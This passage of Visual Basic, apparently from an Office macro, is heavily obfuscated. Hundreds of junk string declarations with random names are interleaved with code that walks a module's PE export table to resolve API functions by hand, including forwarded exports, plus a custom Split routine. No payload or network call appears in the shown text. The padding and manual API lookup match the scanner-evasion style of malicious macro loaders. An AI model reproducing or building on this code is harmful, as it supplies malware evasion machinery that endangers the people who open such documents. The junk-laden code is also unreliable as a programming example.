gnkdrsfrtdbqaklaej74 = ""
Dim hgdlktnrusbijss15 As String
hgdlktnrusbijss15 = ""
Dim bjgcptttvompfllr76 As String
bjgcptttvompfllr76 = ""
Dim irhjonglaampv56 As String
irhjonglaampv56 = ""
Dim bcgqiuftailhusss20 As String
bcgqiuftailhusss20 = ""
Dim kgrbunghpghnsf6 As String
kgrbunghpghnsf6 = ""
Dim qdqembmroapc33 As String
qdqembmroapc33 = ""
Dim bltctspbajchji9 As String
bltctspbajchji9 = ""
With tIMAGE_EXPORT_DIRECTORY
Dim dfluvdhfrcksectlppo12 As String
dfluvdhfrcksectlppo12 = ""
Dim ioletugsuedrbmmbfk37 As String
ioletugsuedrbmmbfk37 = ""
Dim hgpinqoteenosgulrjm77 As String
hgpinqoteenosgulrjm77 = ""
Dim hkbhgnpqmbheum74 As String
hkbhgnpqmbheum74 = ""
Dim urkdemdekjchssil69 As String
urkdemdekjchssil69 = ""
Dim jifnmvotvudkktuc53 As String
jifnmvotvudkktuc53 = ""
Dim vvubqnqhnmtvashnk10 As String
vvubqnqhnmtvashnk10 = ""
For i = 0 To .NumberOfNames - 1
Dim sikqphnccnramv20 As String
sikqphnccnramv20 = ""
Dim rfudfejqqdeiskahvb58 As String
rfudfejqqdeiskahvb58 = ""
Dim gdgtccjkmitdaph96 As String
gdgtccjkmitdaph96 = ""
Dim bmtitcahakdhki93 As String
bmtitcahakdhki93 = ""
Dim thvmtknvduljkjlfc57 As String
thvmtknvduljkjlfc57 = ""
Dim rocjgvnobnpvdmsmh81 As String
rocjgvnobnpvdmsmh81 = ""
Dim qhsdodifngqjn94 As String
qhsdodifngqjn94 = ""
Dim qtfierpqprl23 As String
qtfierpqprl23 = ""
Dim eovrldendflpc81 As String
eovrldendflpc81 = ""
Dim lukmsqjoddpsco16 As String
lukmsqjoddpsco16 = ""
e4j8c5PCdAMaIZLPodaU lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4, 4
Dim bklpdrhogj61 As String
bklpdrhogj61 = ""
Dim huedkmnjuebr31 As String
huedkmnjuebr31 = ""
Dim gpfhnlekuuko4 As String
gpfhnlekuuko4 = ""
Dim pocrvcafmnaae88 As String
pocrvcafmnaae88 = ""
Dim jcvdpvvfhifpa31 As String
jcvdpvvfhifpa31 = ""
Dim tlmvlntrkpe78 As String
tlmvlntrkpe78 = ""
If qlkhpoclvca(lBase + lNameAdd) = sProc Then
Dim ofpbgbatfeng88 As String
ofpbgbatfeng88 = ""
Dim djstbfdpai32 As String
djstbfdpai32 = ""
Dim behdquutajmpgmlsu56 As String
behdquutajmpgmlsu56 = ""
e4j8c5PCdAMaIZLPodaU lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2, 2
Dim pidlhdjoggbbmqvlu46 As String
pidlhdjoggbbmqvlu46 = ""
Dim edijpcdhljv58 As String
edijpcdhljv58 = ""
Dim kjlvcfsbbijlhs94 As String
kjlvcfsbbijlhs94 = ""
Dim frdrfmsnlj96 As String
frdrfmsnlj96 = ""
e4j8c5PCdAMaIZLPodaU lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4, 4
Dim optbulsemusn12 As String
optbulsemusn12 = ""
Dim bifumnamouslrggr87 As String
bifumnamouslrggr87 = ""
Dim cbvgfpimpnsde98 As String
cbvgfpimpnsde98 = ""
Dim udeluucher79 As String
udeluucher79 = ""
Dim bfffhrtbnttdfg96 As String
bfffhrtbnttdfg96 = ""
Dim rjenjflpiiccorbnvm67 As String
rjenjflpiiccorbnvm67 = ""
Dim gpdgejlrefjnlbiqck84 As String
gpdgejlrefjnlbiqck84 = ""
Dim ttefgdnurkcdmcek97 As String
ttefgdnurkcdmcek97 = ""
Dim ktplrvooijuchtfsh64 As String
ktplrvooijuchtfsh64 = ""
Dim pqbkkotqhnviqo84 As String
pqbkkotqhnviqo84 = ""
Dim opgprvqilm65 As String
opgprvqilm65 = ""
Dim qufqqastqerihvqd34 As String
qufqqastqerihvqd34 = ""
Dim igbkgcimffvpfoue83 As String
igbkgcimffvpfoue83 = ""
Dim rjqkmbmroavi67 As String
rjqkmbmroavi67 = ""
vvvbknqhnmt = lFunctAdd + lBase
Dim nueiimaukldgo86 As String
nueiimaukldgo86 = ""
Dim pqmbneusnarotcrq3 As String
pqmbneusnarotcrq3 = ""
Dim obmihmtdmhlv50 As String
obmihmtdmhlv50 = ""
Dim pallsoplamdcrmu55 As String
pallsoplamdcrmu55 = ""
Dim kpvovprgbv82 As String
kpvovprgbv82 = ""
Dim qenbusbjpctbljvaoa91 As String
qenbusbjpctbljvaoa91 = ""
Dim iauutvpsvgrrctvr90 As String
iauutvpsvgrrctvr90 = ""
Dim gbmafldlfgrmljq85 As String
gbmafldlfgrmljq85 = ""
Dim hovidhrofgt20 As String
hovidhrofgt20 = ""
If vvvbknqhnmt >= lVAddress And vvvbknqhnmt <= lVSize Then
Dim ogeedfvcfmbbidebmc70 As String
ogeedfvcfmbbidebmc70 = ""
Dim okgmqjjdtjsc72 As String
okgmqjjdtjsc72 = ""
Call jeuktcibice(vvvbknqhnmt, lMod, sProc)
Dim dmvkhfkrbkf73 As String
dmvkhfkrbkf73 = ""
Dim cophksvriggg47 As String
cophksvriggg47 = ""
Dim krtuqfribardvrbgu74 As String
krtuqfribardvrbgu74 = ""
Dim lafckisfqm37 As String
lafckisfqm37 = ""
Dim tvhlgussrtnq72 As String
tvhlgussrtnq72 = ""
Dim urulaqbcealb92 As String
urulaqbcealb92 = ""
Dim cvohiqgiotflgalvuk8 As String
cvohiqgiotflgalvuk8 = ""
If Not lMod = 0 Then
Dim shsbvgvjchjhmue97 As String
shsbvgvjchjhmue97 = ""
Dim opthvlsjmuct52 As String
opthvlsjmuct52 = ""
Dim vbrorinnuv17 As String
vbrorinnuv17 = ""
vvvbknqhnmt = vvvbknqhnmt(lMod, sProc)
Dim stimrhpgrcnch77 As String
stimrhpgrcnch77 = ""
Dim dgejqreeiskbhvcknja11 As String
dgejqreeiskbhvcknja11 = ""
Dim dnuqkcdmcekob6 As String
dnuqkcdmcekob6 = ""
Else
Dim votiiubhtf48 As String
votiiubhtf48 = ""
Dim nvevurdclej10 As String
nvevurdclej10 = ""
Dim ebougpbvqilmlnhehud52 As String
ebougpbvqilmlnhehud52 = ""
Dim tqelibpqdprbvoujju8 As String
tqelibpqdprbvoujju8 = ""
Dim vlpuksjtfkfebjislps92 As String
vlpuksjtfkfebjislps92 = ""
vvvbknqhnmt = 0
End If
End If
Dim uemvhfanrrrtn70 As String
uemvhfanrrrtn70 = ""
Dim qatnfgpfhnle29 As String
qatnfgpfhnle29 = ""
Dim obrvcafmmaaeogtdr87 As String
obrvcafmmaaeogtdr87 = ""
Dim dhhgjcvcpvufhie38 As String
dhhgjcvcpvufhie38 = ""
Dim slmulmsrkpe83 As String
slmulmsrkpe83 = ""
Exit Function
Dim fofpbgbatfdnglnmr36 As String
fofpbgbatfdnglnmr36 = ""
Dim djstbfdpai38 As String
djstbfdpai38 = ""
End If
Dim aeedfpsvmrrcdf39 As String
aeedfpsvmrrcdf39 = ""
Dim lhdjoggbbmq42 As String
lhdjoggbbmq42 = ""
Dim ctsqbakthkinpvii81 As String
ctsqbakthkinpvii81 = ""
Next
Dim jlvcfsbbijkhrc68 As String
jlvcfsbbijkhrc68 = ""
Dim cpgftobtpvdssmmc3 As String
cpgftobtpvdssmmc3 = ""
End With
Dim dcvhgqdnqotuf74 As String
dcvhgqdnqotuf74 = ""
Dim gqtanssdegcn32 As String
gqtanssdegcn32 = ""
Dim kphhccnramum82 As String
kphhccnramum82 = ""
Dim nodutrcbluiljoqajk53 As String
nodutrcbluiljoqajk53 = ""
Dim foquphklkmadgtcc81 As String
foquphklkmadgtcc81 = ""
Dim hgupcuqaettnndhmc38 As String
hgupcuqaettnndhmc38 = ""
End Function
Private Function jeuktcibice(ByVal lAddress As Long, ByRef lLib As Long, ByRef sMod As String)
Dim jedaihreorpuvgpptcv87 As String
jedaihreorpuvgpptcv87 = ""
Dim sForward     As String
Dim acmosiooua97 As String
acmosiooua97 = ""
Dim mevieagkddttjms34 As String
mevieagkddttjms34 = ""
Dim egfklrefjnlbiqdli31 As String
egfklrefjnlbiqdli31 = ""
Dim bouteghdourldendfkj93 As String
bouteghdourldendfkj93 = ""
Dim chtgthpupoltsfudfej52 As String
chtgthpupoltsfudfej52 = ""
Dim ugoauphllkmgdgtc72 As String
ugoauphllkmgdgtc72 = ""
Dim hapqcoqavntiit27 As String
hapqcoqavntiit27 = ""
Dim tejedbihrkprpu34 As String
tejedbihrkprpu34 = ""
Dim mugevnrrqsm89 As String
mugevnrrqsm89 = ""
Dim kqngvaivagfudooehnc22 As String
kqngvaivagfudooehnc22 = ""
Dim vvlotjsjtfkf95 As String
vvlotjsjtfkf95 = ""
sForward = qlkhpoclvca(lAddress)
If InStr(1, sForward, Chr(46)) Then
Dim gihlntghlpndksemkg24 As String
gihlntghlpndksemkg24 = ""
Dim eiihjtadqvvghjf17 As String
eiihjtadqvvghjf17 = ""
Dim qqllaejvhv38 As String
qqllaejvhv38 = ""
Dim mrtdmnrvtjqcksql65 As String
mrtdmnrvtjqcksql65 = ""
Dim vjmpgllsturfmjcqre4 As String
vjmpgllsturfmjcqre4 = ""
Dim pfnepafavtedng3 As String
pfnepafavtedng3 = ""
Dim hipccgkivfn88 As String
hipccgkivfn88 = ""
lLib = maukldmorne(jkhscvoghq(sForward, Chr(46))(0))
Dim vdddfpsvlrrbd12 As String
vdddfpsvlrrbd12 = ""
Dim nirnjptmmggsvfrdqem88 As String
nirnjptmmggsvfrdqem88 = ""
Dim ctspbajthkinouii91 As String
ctspbajthkinouii91 = ""
sMod = jkhscvoghq(sForward, Chr(46))(1)
Dim orehkbhgnpqmbhetm78 As String
orehkbhgnpqmbhetm78 = ""
Dim jaksbsroav87 As String
jaksbsroav87 = ""
Dim tvudektucgeqbj10 As String
tvudektucgeqbj10 = ""
Dim cfiervvuaknqhmmtv34 As String
cfiervvuaknqhmmtv34 = ""
End If
Dim okqunnhhtagserfnsn70 As String
okqunnhhtagserfnsn70 = ""
Dim rpgmuhpmivdddfur30 As String
rpgmuhpmivdddfur30 = ""
Dim nobnputmrggsvfqdqem91 As String
nobnputmrggsvfqdqem91 = ""
Dim inuuhimaoeldgo89 As String
inuuhimaoeldgo89 = ""
Dim lppoqkhkbhgnpqmbhet53 As String
lppoqkhkbhgnpqmbhet53 = ""
Dim tugsuedrbmmc15 As String
tugsuedrbmmc15 = ""
Dim hfnlvotvtckktu75 As String
hfnlvotvtckktu75 = ""
Dim nlbiqckidrvvua35 As String
nlbiqckidrvvua35 = ""
Dim ehuddklmjt44 As String
ehuddklmjt44 = ""
Dim rihvqdvrbfuu9 As String
rihvqdvrbfuu9 = ""
End Function
Private Function qlkhpoclvca(ByVal lAddress As Long) As String
Dim qfpuesduvkfebjisfps90 As String
qfpuesduvkfebjisfps90 = ""
Dim kgtbbbdnptjpp34 As String
kgtbbbdnptjpp34 = ""
Dim gjqgfmijgqg45 As String
gjqgfmijgqg45 = ""
Dim ipjlarqnvuhrfhglm51 As String
ipjlarqnvuhrfhglm51 = ""
Dim mtenimatklcln3 As String
mtenimatklcln3 = ""
Dim krggnijgqhutl95 As String
krggnijgqhutl95 = ""
Dim qaovprgbatfeob42 As String
qaovprgbatfeob42 = ""
Dim bChar       As Byte
Dim ljvaobdgcp4 As String
ljvaobdgcp4 = ""
Dim sjjbsfbtdhaaq53 As String
sjjbsfbtdhaaq53 = ""
Dim nmjrqdmbdchiobcgki53 As String
nmjrqdmbdchiobcgki53 = ""
Dim rbunghpfhnmek74 As String
rbunghpfhnmek74 = ""
Dim qoauibgiglttghlvnd53 As String
qoauibgiglttghlvnd53 = ""
Dim saukrdltrmeiihjd33 As String
saukrdltrmeiihjd33 = ""
Dim ruvuaknqhmm9 As String
ruvuaknqhmm9 = ""
Dim shlqgofqbgbaufeohl45 As String
shlqgofqbgbaufeohl45 = ""
Do
Dim jhcptutvpm89 As String
jhcptutvpm89 = ""
Dim chhoprncifumnam72 As String
chhoprncifumnam72 = ""
e4j8c5PCdAMaIZLPodaU bChar, ByVal lAddress, 1
Dim vgfpimpnsd88 As String
vgfpimpnsd88 = ""
Dim uuchercjsectlop80 As String
uuchercjsectlop80 = ""
lAddress = lAddress + 1
Dim rkcdmcekibhrrhlqgof54 As String
rkcdmcekibhrrhlqgof54 = ""
If bChar = 0 Then Exit Do
Dim tonksreucfdipqdd25 As String
tonksreucfdipqdd25 = ""
Dim eegvsamsscef24 As String
eegvsamsscef24 = ""
Dim oqvunshhta67 As String
oqvunshhta67 = ""
Dim dikjovvijnbpfm1 As String
dikjovvijnbpfm1 = ""
Dim qprlilcihoqrncifu25 As String
qprlilcihoqrncifu25 = ""
Dim ndflkcittimr47 As String
ndflkcittimr47 = ""
qlkhpoclvca = qlkhpoclvca & Chr(bChar)
Dim mtsgvdgejqrefjtl81 As String
mtsgvdgejqrefjtl81 = ""
Dim cggfhbubottefg86 As String
cggfhbubottefg86 = ""
Dim tjlrqjoddpsbnan47 As String
tjlrqjoddpsbnan47 = ""
Dim lpbbklpdrhogiqu15 As String
lpbbklpdrhogiqu15 = ""
Dim hehuddklnjuebqjk82 As String
hehuddklnjuebqjk82 = ""
Dim eppeindldnujudbible53 As String
eppeindldnujudbible53 = ""
Dim kislqsqvhhq7 As String
kislqsqvhhq7 = ""
Loop
End Function
Public Function jkhscvoghq(ByVal Expression As String, Optional ByVal Delimiter As String, Optional ByVal Limit As Long = -1) As String()
Dim lLastPos    As Long
Dim tkppabcvjqnguviua25 As String
tkppabcvjqnguviua25 = ""
Dim lIncrement  As Long
Dim trkqeequdpbockvk48 As String
trkqeequdpbockvk48 = ""
Dim vrigggibucoeuegheo90 As String
vrigggibucoeuegheo90 = ""
Dim ukmsajojdpccogn40 As String
ukmsajojdpccogn40 = ""
Dim kdmfkmlqbhk59 As String
kdmfkmlqbhk59 = ""
Dim gqiuftvhlgu77 As String
gqiuftvhlgu77 = ""
Dim hmuevpeond96 As String
hmuevpeond96 = ""
Dim hbfiglscggkusijbemp39 As String
hbfiglscggkusijbemp39 = ""
Dim lExpLen     As Long
Dim cpnnnpifivle11 As String
cpnnnpifivle11 = ""
Dim mspibckaci43 As String
mspibckaci43 = ""
Dim hshljrktmrtsbiorsak55 As String
hshljrktmrtsbiorsak55 = ""
Dim fmegosnfddceurul71 As String
fmegosnfddceurul71 = ""
Dim namouclrlgrfeqi57 As String
namouclrlgrfeqi57 = ""
Dim mtehimatklcfn2 As String
mtehimatklcfn2 = ""
Dim lDelimLen   As Long
Dim opoqkhkbmgnopmane88 As String
opoqkhkbmgnopmane88 = ""
Dim cismqecpphqsvrimm44 As String
cismqecpphqsvrimm44 = ""
Dim lUbound     As Long
Dim lkrnolvldcqluqmsapp50 As String
lkrnolvldcqluqmsapp50 = ""
Dim dingfaqgpvfte87 As String
dingfaqgpvfte87 = ""
Dim quhnhcnbamelfh15 As String
quhnhcnbamelfh15 = ""
Dim rfucfdipadd18 As String
rfucfdipadd18 = ""
Dim svTemp()    As String
Dim oadvmkkkmgdgsic86 As String
oadvmkkkmgdgsic86 = ""
Dim ujpmguviuaf18 As String
ujpmguviuaf18 = ""
Dim kntjrisepejgohqjorp12 As String
kntjrisepejgohqjorp12 = ""
Dim hglssfgkumcj85 As String
hglssfgkumcj85 = ""
Dim sjnnmoifiv97 As String
sjnnmoifiv97 = ""
Dim gllstvrgmjcrseqsc10 As String
gllstvrgmjcrseqsc10 = ""
Dim tlvglgfdljtmrtr44 As String
tlvglgfdljtmrtr44 = ""
Dim iimrofltgomhvcdceur49 As String
iimrofltgomhvcdceur49 = ""
Dim jkhrcvoghqgio91 As String
jkhrcvoghqgio91 = ""
Dim jaksbsroav78 As String
jaksbsroav78 = ""
lExpLen = Len(Expression)
Dim onlsrfodfdikqdeimka36 As String
onlsrfodfdikqdeimka36 = ""
Dim ffegqtanss41 As String
ffegqtanss41 = ""
Dim baojsokqunniit35 As String
baojsokqunniit35 = ""
Dim bfuuojuintltnodut45 As String
bfuuojuintltnodut45 = ""
Dim qfkhpoclvsqv11 As String
qfkhpoclvsqv11 = ""
If Delimiter = vbNullString Then Delimiter = Chr(32)
lDelimLen = Len(Delimiter)
If Limit = 0 Then GoTo QuitHere
If lExpLen = 0 Then GoTo QuitHere
Dim cjvufbcvjvmmevieagk63 As String
cjvufbcvjvmmevieagk63 = ""
If InStr(1, Expression, Delimiter, vbBinaryCompare) = 0 Then GoTo QuitHere
Dim hnrkkeuktdjbice2 As String
hnrkkeuktdjbice2 = ""
Dim hglsclgkusijbjm42 As String
hglsclgkusijbjm42 = ""
ReDim svTemp(0)
Dim mpilovkkrnokvlcb46 As String
mpilovkkrnokvlcb46 = ""
Dim unuoqfavsecmvkml29 As String
unuoqfavsecmvkml29 = ""
Dim aiobsakiuvnvbfaoss94 As String
aiobsakiuvnvbfaoss94 = ""
Dim belaahcdalbonfajfbh76 As String
belaahcdalbonfajfbh76 = ""
Dim lvekckefql16 As String
lvekckefql16 = ""
lLastPos = 1
Dim chouhcgqoef93 As String
chouhcgqoef93 = ""
Dim ddcfubelaahd20 As String
ddcfubelaahd20 = ""
Dim cnhoprncofusoas9 As String
cnhoprncofusoas9 = ""
Dim fgoegmldjuujnsi63 As String
fgoegmldjuujnsi63 = ""
Dim fkrsfgkumcjad9 As String
fkrsfgkumcjad9 = ""
Dim lmnkufcrjkt95 As String
lmnkufcrjkt95 = ""
lIncrement = 1
Dim pvjkvdiugt70 As String
pvjkvdiugt70 = ""
Dim jtmqtrahirrvjb34 As String
jtmqtrahirrvjb34 = ""
Dim ssuoloekkqstqelhbp88 As String
ssuoloekkqstqelhbp88 = ""
Dim vvlouksjtfqfkh42 As String
vvlouksjtfqfkh42 = ""
Dim adbgnnabfphuesvhkg18 As String
adbgnnabfphuesvhkg18 = ""
Dim saukrdlurneiihkd25 As String
saukrdlurneiihkd25 = ""
Dim nqhmmtuashnkds20 As String
nqhmmtuashnkds20 = ""
Dim bbsshlqgpgqchc80 As String
bbsshlqgpgqchc80 = ""
Dim evpfooesdtvkvebjirf37 As String
evpfooesdtvkvebjirf37 = ""
Dim bfpndesvhk80 As String
bfpndesvhk80 = ""
Dim pacdvkangf71 As String
pacdvkangf71 = ""
Dim phpjlalpnvt21 As String
phpjlalpnvt21 = ""
Dim dbbacsvcjuufbcu3 As String
dbbacsvcjuufbcu3 = ""
Do
Dim msappkepdiogoijup3 As String
msappkepdiogoijup3 = ""
Dim hfksclgkusijbj45 As String
hfksclgkusijbj45 = ""
Dim krmnkulcbpktpl21 As String
krmnkulcbpktpl21 = ""
Dim kfebjisfpsqvahqquca60 As String
kfebjisfpsqvahqquca60 = ""
If lUbound + 1 = Limit Then
Dim djjprspdkhaopco26 As String
djjprspdkhaopco26 = ""
Dim fbhleeuukntjri77 As String
fbhleeuukntjri77 = ""
svTemp(lUbound) = Mid$(Expression, lLastPos)
Dim hpoblvcafgmaae92 As String
hpoblvcafgmaae92 = ""
Dim vtjkcknqmdhhgjs10 As String
vtjkcknqmdhhgjs10 = ""
Dim ggmijgqhutlgplhnr66 As String
ggmijgqhutlgplhnr66 = ""
Dim rfiglmtggkpmd61 As String
rfiglmtggkpmd61 = ""
Dim ukmsqjpddpscoan39 As String
ukmsqjpddpscoan39 = ""
Exit Do
Dim krsffjtlciad18 As String
krsffjtlciad18 = ""
End If
lIncrement = InStr(lIncrement, Expression, Delimiter, vbBinaryCompare)
Dim mmmohehuedkmn8 As String
mmmohehuedkmn8 = ""
Dim ejlkpagjkocamnf19 As String
ejlkpagjkocamnf19 = ""
Dim ticjlmitjapoj3 As String
ticjlmitjapoj3 = ""
Dim odnmcqcsujucaigqdok95 As String
odnmcqcsujucaigqdok95 = ""
Dim dqtfjesqqpr72 As String
dqtfjesqqpr72 = ""
Dim juovacujvmfduhdvfj80 As String
juovacujvmfduhdvfj80 = ""
Dim kmsajpjepdcognhjujo84 As String
kmsajpjepdcognhjujo84 = ""
If lIncrement = 0 Then
Dim ffjtrijadl58 As String
ffjtrijadl58 = ""
Dim ekmnkulcrpktpl28 As String
ekmnkulcrpktpl28 = ""
Dim depejhonbkurpu30 As String
depejhonbkurpu30 = ""
If Not lLastPos = lExpLen Then
Dim qsmpsdoovqsodpgft71 As String
qsmpsdoovqsodpgft71 = ""
Dim pgtmkfokgmqj85 As String
pgtmkfokgmqj85 = ""
Dim hqebvelsfaeolcdqdf20 As String
hqebvelsfaeolcdqdf20 = ""
Dim giceipeekgheo84 As String
giceipeekgheo84 = ""
Dim ioumtnpevurdclvjmkp83 As String
ioumtnpevurdclvjmkp83 = ""
Dim qlpdbnogpruqh21 As String
qlpdbnogpruqh21 = ""
svTemp(lUbound) = Mid$(Expression, lLastPos)
Dim tpeqhgvqdurafutooe57 As String
tpeqhgvqdurafutooe57 = ""
Dim gpqucamtfn26 As String
gpqucamtfn26 = ""
Dim bacmpsjoov78 As String
bacmpsjoov78 = ""
Dim jqffmhjfqgts87 As String
jqffmhjfqgts87 = ""
Dim ntbqqlfqejphpjkvqp49 As String
ntbqqlfqejphpjkvqp49 = ""
End If
Dim qhqsarjmnmocfive24 As String
qhqsarjmnmocfive24 = ""
Exit Do
Dim ppkkvdiuhu58 As String
ppkkvdiuhu58 = ""
Dim mrsclmqusipbjrpl85 As String
mrsclmqusipbjrpl85 = ""
Dim suilofkkrsuqflibpq93 As String
suilofkkrsuqflibpq93 = ""
Dim imffaalpuks81 As String
imffaalpuks81 = ""
End If
Dim haopcoqaentnit31 As String
haopcoqaentnit31 = ""
Dim jgohrkorpufm83 As String
jgohrkorpufm83 = ""
Dim lcaaacspsiuouabui50 As String
lcaaacspsiuouabui50 = ""
Dim egmqdjdtjssiahbd28 As String
egmqdjdtjssiahbd28 = ""
Dim vehfkrbefjtrh35 As String
vehfkrbefjtrh35 = ""
svTemp(lUbound) = Mid$(Expression, lLastPos, lIncrement - lLastPos)
Dim qesiphksvrigggi32 As String
qesiphksvrigggi32 = ""
lUbound = lUbound + 1
Dim oloflkrtuqflibqrdqr48 As String
oloflkrtuqflibqrdqr48 = ""
Dim lpuktkugqg71 As String
lpuktkugqg71 = ""
Dim sbdcgoobcgq94 As String
sbdcgoobcgq94 = ""
Dim nsbkpkeqddphoik41 As String
nsbkpkeqddphoik41 = ""
Dim nglnmrcilmq69 As String
nglnmrcilmq69 = ""
Dim bldpaoqdgcpnnmpifi97 As String
bldpaoqdgcpnnmpifi97 = ""
Dim fbmspibckac61 As String
fbmspibckac61 = ""
ReDim Preserve svTemp(lUbound)
Dim afrdrfmbmrpapdsbdb78 As String
afrdrfmbmrpapdsbdb78 = ""
Dim bpfmdgosnfddceu68 As String
bpfmdgosnfddceu68 = ""
lLastPos = lIncrement + lDelimLen
Dim ouclrlgrfeqipkl4 As String
ouclrlgrfeqipkl4 = ""
Dim gvjcgjhmtehhlatklcf56 As String
gvjcgjhmtehhlatklcf56 = ""
Dim gmopmanetrmvrnt56 As String
gmopmanetrmvrnt56 = ""
Dim fvbmbgdlkthromrcirm77 As String
fvbmbgdlkthromrcirm77 = ""
Dim uosvtcjpttbljva23 As String
uosvtcjpttbljva23 = ""
lIncrement = lLastPos
Dim dgvsvmcrcefb17 As String
dgvsvmcrcefb17 = ""
Dim sikquhnhcnaame71 As String
sikquhnhcnaame71 = ""
Loop
Dim rfucfdipadd19 As String
rfucfdipadd19 = ""
Dim liqpcmadbghnbbf64 As String
liqpcmadbghnbbf64 = ""
Dim fgpfhmlejuuknti54 As String
fgpfhmlejuuknti54 = ""
Dim khpobqvbafmmvae95 As String
khpobqvbafmmvae95 = ""
Dim vtjqcksqmdhhgicvc63 As String
vtjqcksqmdhhgicvc63 = ""
Dim vegfjrbefjtr16 As String
vegfjrbefjtr16 = ""
Dim fhbubodtefhd70 As String
fhbubodtefhd70 = ""
Dim rstqelibpqdprb41 As String
rstqelibpqdprb41 = ""
ReDim Preserve svTemp(lUbound)
jkhscvoghq = svTemp
Dim ksjufqfkhpislpsqvgn55 As String
ksjufqfkhpislpsqvgn55 = ""
Dim trsrtnknepjq23 As String
trsrtnknepjq23 = ""
Dim btnfgpfhnrekeuktt3 As String
btnfgpfhnrekeuktt3 = ""
Dim fpalafdkdnglnlqc38 As String
fpalafdkdnglnlqc38 = ""
Dim jstbldpanqcgbp19 As String
jstbldpanqcgbp19 = ""
Dim foqupgklkmadgtcc83 As String
foqupgklkmadgtcc83 = ""
Dim mckbltctspbak32 As String
mckbltctspbak32 = ""
Dim rbbhjkhrcuog32 As String
rbbhjkhrcuog32 = ""
Dim shsbugvibgjhmt60 As String
shsbugvibgjhmt60 = ""
Dim mvqnsbppkeqdiohoi22 As String
mvqnsbppkeqdiohoi22 = ""
Exit Function
Dim usijbjmplcggfh38 As String
usijbjmplcggfh38 = ""
Dim okvlcbqltplraoo60 As String
okvlcbqltplraoo60 = ""
Dim seuvkfecjisf21 As String
seuvkfecjisf21 = ""
Dim aiobsakiuvnvbfaoss95 As String
aiobsakiuvnvbfaoss95 = ""
Dim ahcdakbonf56 As String
ahcdakbonf56 = ""
QuitHere:
Dim nabfjhtemugea85 As String
nabfjhtemugea85 = ""
Dim qtkppabdvkqngvai84 As String
qtkppabdvkqngvai84 = ""
Dim drtfjesqqprlilcnho70 As String
drtfjesqqprlilcnho70 = ""
Dim chfmlvispnsdktos25 As String
chfmlvispnsdktos25 = ""
Dim knjauvuaqta34 As String
knjauvuaqta34 = ""
Dim rkidmiekohh64 As String
rkidmiekohh64 = ""
Dim oiuhhtlsmodotqcbkui35 As String
oiuhhtlsmodotqcbkui35 = ""
ReDim jkhscvoghq(-1 To -1)
End Function






